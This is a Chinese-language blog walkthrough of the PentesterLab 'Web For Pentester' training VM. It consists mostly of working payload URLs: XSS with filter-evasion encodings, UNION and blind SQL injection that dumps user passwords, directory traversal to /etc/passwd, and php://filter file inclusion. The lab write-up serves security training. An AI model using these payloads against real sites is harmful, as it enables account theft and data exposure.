<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>Pentesterlab: Web For Pentester | C0r1&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Pentesterlab: Web For Pentester</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 10, 2020&nbsp;&nbsp;13:03:06</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Pentesterlab-Web-For-Pentester"><a href="#Pentesterlab-Web-For-Pentester" class="headerlink" title="Pentesterlab: Web For Pentester"></a>Pentesterlab: Web For Pentester</h1><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p><a href="https://pentesterlab.com/exercises/web_for_pentester/course" target="_blank" rel="noopener">Pentesterlab</a> &#x63D0;&#x4F9B;&#x7684;&#x4E00;&#x6B3E;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x9776;&#x673A;&#x5E73;&#x53F0;&#x3002;&#x4F7F;&#x7528; VMware &#x642D;&#x5EFA;&#x540E;&#xFF0C;&#x8FDB;&#x5165;&#x9776;&#x673A;&#x83B7;&#x53D6;&#x5230; IP &#x540E;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/1_1.png" alt="image-20200309193715431"></p>
<p>&#x672C;&#x673A; Host &#x5C06;&#x9776;&#x673A; IP &#x7ED1;&#x5B9A;&#x5230; test.com</p>
<h2 id="Pentest"><a href="#Pentest" class="headerlink" title="Pentest"></a>Pentest</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="XSS-Example-1"><a href="#XSS-Example-1" class="headerlink" title="XSS Example 1"></a>XSS Example 1</h4><p>URL&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example1.php?name=hacker</span><br></pre></td></tr></table></figure>

<p>GET &#x53C2;&#x6570; <code>$name</code>  &#x53EF;&#x63A7;&#xFF0C;<code>$name</code> &#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"> ...</span><br><span class="line">Hello </span><br><span class="line">hacker  <span class="comment">&lt;!-- $name=&quot;hacker&quot; --&gt;</span></span><br><span class="line"> ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x7ECF;&#x6D4B;&#x8BD5;&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example1.php?name=%3Csvg%20onload=alert(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-2"><a href="#XSS-Example-2" class="headerlink" title="XSS Example 2"></a>XSS Example 2</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x60C5;&#x51B5;&#x540C; 1</p>
<p>&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example2.php?name=%3Csvg%20onload=alert(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-3"><a href="#XSS-Example-3" class="headerlink" title="XSS Example 3"></a>XSS Example 3</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x60C5;&#x51B5;&#x540C; 1</p>
<p>&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example3.php?name=%3Csvg%20onload=alert(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-4"><a href="#XSS-Example-4" class="headerlink" title="XSS Example 4"></a>XSS Example 4</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x60C5;&#x51B5;&#x540C; 1</p>
<p>&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example4.php?name=%3Csvg%20onload=alert(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-5"><a href="#XSS-Example-5" class="headerlink" title="XSS Example 5"></a>XSS Example 5</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x60C5;&#x51B5;&#x540C; 1</p>
<p>&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;&#x3002;&#x3002;&#x3002;&#x9875;&#x9762;&#x8FD4;&#x56DE; <code>error</code></p>
<p>&#x731C;&#x6D4B;&#x5BF9;&#x5173;&#x952E;&#x8BCD;&#x8FDB;&#x884C;&#x4E86;&#x62E6;&#x622A;&#xFF0C;FUZZ &#x6D4B;&#x5F97;&#x53C2;&#x6570;&#x5305;&#x542B; <code>alert</code> &#x65F6;&#xFF0C;&#x9875;&#x9762;&#x8FD4;&#x56DE; <code>error</code></p>
<ul>
<li>&#x5C1D;&#x8BD5; <code>URLEncode(HTMLEntity(&apos;alert&apos;))</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example5.php?name=%3Csvg%20onload=%26%2397%3b%26%23108%3b%26%23101%3b%26%23114%3b%26%23116%3b(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-6"><a href="#XSS-Example-6" class="headerlink" title="XSS Example 6"></a>XSS Example 6</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	var $a= &quot;hacker&quot;;  //$name=&quot;hacker&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x672A;&#x8FC7;&#x6EE4; XSS Payload &#x5E38;&#x7528;&#x7B26;&#x53F7;&#xFF0C;&#x95ED;&#x5408;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example6.php?name=%22-alert(document.cookie)-%22</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-7"><a href="#XSS-Example-7" class="headerlink" title="XSS Example 7"></a>XSS Example 7</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	var $a= &apos;hacker&apos;;  //$name=&apos;hacker&apos;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x7ECF;&#x6D4B;&#x8BD5;&#x5B9E;&#x4F53;&#x5316;&#x7F16;&#x7801;&#xFF1A;&#x5927;&#x4E8E;&#x5C0F;&#x4E8E;&#x53F7;&#xFF08;<code>&lt; &gt;</code>&#xFF09;&#x3001;&#x53CC;&#x5F15;&#x53F7;&#xFF08;<code>&quot;</code>&#xFF09;&#x3001;<code>&amp;</code> &#x7B26;</p>
<p>&#x5355;&#x5F15;&#x53F7;&#xFF08;<code>&apos;</code>&#xFF09;&#x672A;&#x8FC7;&#x6EE4;&#xFF0C;&#x6B64;&#x5904;&#x4F7F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;&#x5B57;&#x7B26;&#x4E32;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example7.php?name=%27-alert(document.cookie)-%27</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-8"><a href="#XSS-Example-8" class="headerlink" title="XSS Example 8"></a>XSS Example 8</h4><p>&#x6709;&#x4E2A;&#x8F93;&#x5165;&#x6846;&#xFF0C;&#x63D0;&#x4EA4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6D4B;&#x8BD5;&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=()<span class="tag">&lt;&gt;</span>%25%26%23&quot;&apos;&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"> ...</span><br><span class="line">HELLO ()&amp;lt;&amp;gt;%&amp;amp;#&amp;quot;&apos;</span><br><span class="line"> ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x89C2;&#x5BDF;&#x53D1;&#x73B0;&#xFF0C;&#x8FC7;&#x6EE4;&#x4E86; <code>&lt; &gt; # &amp; &quot;</code>&#xFF0C;&#x5230;&#x8FD9;&#x91CC;&#x65AD;&#x4E86;&#x601D;&#x8DEF;&#xFF0C;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_1_1.png" alt="image-20200309231714020"></p>
<p><code>$_POST[&quot;name&quot;]</code> &#x7ECF; <code>htmlentities()</code> &#x51FD;&#x6570;&#x5904;&#x7406;&#x96BE;&#x4EE5;&#x5229;&#x7528;</p>
<p>&#x6CE8;&#x610F;&#x5230;&#x8868;&#x5355;&#x4E2D;&#x8FD8;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x53C2;&#x6570; <code>$_SERVER[&apos;PHP_SELF&apos;]</code></p>
<blockquote>
<p>$_SERVER[&#x2018;PHP_SELF&#x2019;]&#xFF1A;&#x83B7;&#x53D6;&#x76F8;&#x5BF9;&#x4E8E;&#x6587;&#x6863;&#x6839;&#x76EE;&#x5F55;&#x7684;&#x5F53;&#x524D;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x6587;&#x4EF6;&#x540D;</p>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x5730;&#x5740;&#x4E3A;&#xFF1A;<code>http://example.com/foo/bar.php</code> &#x7684;&#x811A;&#x672C;&#x4E2D;&#x7684; $ _SERVER [&#x2018;PHP_SELF&#x2019;] &#x4E3A; /foo/bar.php</p>
</blockquote>
<p>&#x7531;&#x6B64;&#xFF0C;&#x8BBF;&#x95EE; <code>/xss/example8.php/&quot;&gt;&lt;svg/onload=alert(document)&gt;</code> &#x5373;&#x53EF;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example8.php/%22%3E%3Csvg/onload=alert(document.cookie)%3E</span><br></pre></td></tr></table></figure>

<h4 id="XSS-Example-9"><a href="#XSS-Example-9" class="headerlink" title="XSS Example 9"></a>XSS Example 9</h4><p>&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x4E0A;&#x4E0B;&#x6587;&#x5982;&#x4E0B;:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  document.write(location.hash.substring(1));</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x5F88;&#x660E;&#x663E;&#x7684; DOM &#x578B; XSS&#xFF0C;&#x76F4;&#x63A5;&#x63D2;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xss/example9.php#%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p>&#x7ED3;&#x679C;&#x53D1;&#x73B0;&#xFF0C;<code>&lt; &gt;</code> &#x88AB;&#x591A;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21; URL &#x7F16;&#x7801;&#xFF0C;&#x641C;&#x7D22;&#x53D1;&#x73B0;&#xFF1A;</p>
<blockquote>
<p><a href="http://www.sec-art.net/2018/05/web-for-pentester-xss-examples-walk.html" target="_blank" rel="noopener">Note</a> : The example9 may not work on modern browsers, because they have protection against DOM based attacks. So test it on old versions of browsers. It works on internet explorers in windows xp.</p>
</blockquote>
<p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#x5C31;&#x662F;&#xFF1A;&#x73B0;&#x4EE3;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x57FA;&#x4E8E; DOM &#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x65E7;&#x7248;&#x672C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E0A;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;</p>
<h3 id="SQL-Injections"><a href="#SQL-Injections" class="headerlink" title="SQL Injections"></a>SQL Injections</h3><h4 id="SQL-Example-1"><a href="#SQL-Example-1" class="headerlink" title="SQL Example 1"></a>SQL Example 1</h4><p>&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example1.php?name=%27union+select+1,(SELECT+GROUP_CONCAT(name,%27@%27,passwd+SEPARATOR+0x3c62723e)+FROM+users),3,4,5--+</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-2"><a href="#SQL-Example-2" class="headerlink" title="SQL Example 2"></a>SQL Example 2</h4><p>&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038; - &#x8FC7;&#x6EE4;&#xFF1A;&#x7A7A;&#x683C;&#xFF08;+&#xFF09;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example2.php?name=&apos;/**/union/**/select/**/1,(SELECT/**/GROUP_CONCAT(name,&apos;@&apos;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),3,4,5%23</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-3"><a href="#SQL-Example-3" class="headerlink" title="SQL Example 3"></a>SQL Example 3</h4><p>&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038; - &#x8FC7;&#x6EE4;&#xFF1A;&#x7A7A;&#x683C;&#xFF08;+&#xFF09;&#x540C; 2</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example3.php?name=%27/**/union/**/select/**/1,(SELECT/**/GROUP_CONCAT(name,%27@%27,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),3,4,5%23</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-4"><a href="#SQL-Example-4" class="headerlink" title="SQL Example 4"></a>SQL Example 4</h4><p>&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example4.php?id=-2+union+select+1,(SELECT+GROUP_CONCAT(name,233,passwd+SEPARATOR+0x3c62723e)+FROM+users),3,4,5</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-5"><a href="#SQL-Example-5" class="headerlink" title="SQL Example 5"></a>SQL Example 5</h4><p>&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example5.php?id=0+union+select+1,(SELECT+GROUP_CONCAT(name,233,passwd+SEPARATOR+0x3c62723e)+FROM+users),3,4,5</span><br></pre></td></tr></table></figure>

<p>&#x770B;&#x6E90;&#x4EE3;&#x7801; <code>$id</code> &#x8981;&#x4EE5;&#x6570;&#x5B57;&#x5F00;&#x5934;&#x3002;&#x3002;&#x602A;&#x4E0D;&#x5F97;&#x51CF;&#x53F7;&#x62A5;&#x9519; </p>
<h4 id="SQL-Example-6"><a href="#SQL-Example-6" class="headerlink" title="SQL Example 6"></a>SQL Example 6</h4><p>&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example6.php?id=0+union+select+1,(SELECT+GROUP_CONCAT(name,233,passwd+SEPARATOR+0x3c62723e)+FROM+users),3,4,5</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-7"><a href="#SQL-Example-7" class="headerlink" title="SQL Example 7"></a>SQL Example 7</h4><p>&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165; - &#x5927;&#x91CF;&#x7A7A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4; - %0a &#x7ED5;&#x8FC7;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqli/example7.php?id=-2%0aunion%0aselect%0a1,(SELECT%0aGROUP_CONCAT(name,&quot;@&quot;,passwd%0aSEPARATOR%0a0x3c62723e)%0aFROM%0ausers),3,4,5</span><br></pre></td></tr></table></figure>

<h4 id="SQL-Example-8"><a href="#SQL-Example-8" class="headerlink" title="SQL Example 8"></a>SQL Example 8</h4><p>&#x770B;&#x53C2;&#x6570;&#x50CF;&#x662F;&#x63D2;&#x5165; order by &#x540E;&#x9762;</p>
<p>order by &#x6CE8;&#x5165; + &#x65E0;&#x62A5;&#x9519;&#x56DE;&#x663E;</p>
<p>&#x5F00;&#x59CB;&#x6D4B;&#x76F2;&#x6CE8;&#xFF0C;Fuzz &#x65E0;&#x679C;&#xFF0C;&#x4E22; sqlmap</p>
<img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_2_1.png" alt="image-20200310010433166" style="zoom: 80%;">

<p>&#x53CD;&#x5F15;&#x53F7;&#x5305;&#x56F4;&#x3002;&#x3002;&#x5B66;&#x5230;&#x4E86;</p>
<h4 id="SQL-Example-9"><a href="#SQL-Example-9" class="headerlink" title="SQL Example 9"></a>SQL Example 9</h4><p>&#x8FD8;&#x662F; order &#x6CE8;&#x5165;&#xFF0C;&#x53C2;&#x6570;&#x65E0;&#x53CD;&#x5F15;&#x53F7;&#x5305;&#x56F4;&#xFF0C;&#x6D4B;&#x8BD5;&#x4F7F;&#x7528;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">2137</span>=(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">2137</span>=<span class="number">2137</span>) <span class="keyword">THEN</span> <span class="number">2137</span> <span class="keyword">ELSE</span> (<span class="keyword">SELECT</span> <span class="number">8927</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">4832</span>) <span class="keyword">END</span>))</span><br></pre></td></tr></table></figure>

<h3 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h3><h4 id="Dir-Example-1"><a href="#Dir-Example-1" class="headerlink" title="Dir Example 1"></a>Dir Example 1</h4><p>&#x6CE8;&#x610F;&#x5230;&#x56FE;&#x50CF;&#x52A0;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<code>http://test.com/dirtrav/example1.php?file=hacker.png</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/dirtrav/example1.php?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="Dir-Example-2"><a href="#Dir-Example-2" class="headerlink" title="Dir Example 2"></a>Dir Example 2</h4><p>&#x56FE;&#x7247;&#x52A0;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<code>dirtrav/example2.php?file=/var/www/files/hacker.png</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="Dir-Example-3"><a href="#Dir-Example-3" class="headerlink" title="Dir Example 3"></a>Dir Example 3</h4><p>&#x56FE;&#x7247;&#x52A0;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<code>http://test.com/dirtrav/example3.php?file=hacker</code></p>
<p>&#x731C;&#x6D4B;&#x4F1A;&#x8865;&#x4E0A;&#x540E;&#x7F00;&#xFF0C;&#x5C1D;&#x8BD5; <code>%00</code> &#x622A;&#x65AD;&#x540E;&#x7F00;&#x8BFB;&#x53D6; <code>/etc/passwd</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/dirtrav/example3.php?file=../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>

<h3 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h3><h4 id="File-Example-1"><a href="#File-Example-1" class="headerlink" title="File Example 1"></a>File Example 1</h4><p>&#x6D4B;&#x8BD5;&#x94FE;&#x63A5;&#xFF1A;<code>http://test.com/fileincl/example1.php?page=intro.php</code></p>
<p>&#x8BD5;&#x4E00;&#x4E0B;&#x4F2A;&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=example1.php</span><br></pre></td></tr></table></figure>

<p>&#x89E3;&#x7801;&#x540E;&#xFF0C;example1.php &#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> ($_GET[<span class="string">&quot;page&quot;</span>]) {</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;page&quot;</span>]);</span><br><span class="line">	} </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&apos;../footer.php&apos;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x6D4B;&#x8BD5; <code>php://input</code>&#xFF1A;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_4_1.png" alt="image-20200310141100975"></p>
<h4 id="File-Example-2"><a href="#File-Example-2" class="headerlink" title="File Example 2"></a>File Example 2</h4><p>&#x6D4B;&#x8BD5;&#x94FE;&#x63A5;&#xFF1A;<code>http://test.com/fileincl/example2.php?page=intro</code></p>
<p>&#x62FC;&#x63A5;&#x4E86;&#x540E;&#x7F00;&#xFF0C;&#x4F7F;&#x7528; <code>%00</code> &#x622A;&#x65AD;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#xFF0C;&#x5229;&#x7528;&#x540C;&#x4E0A;</p>
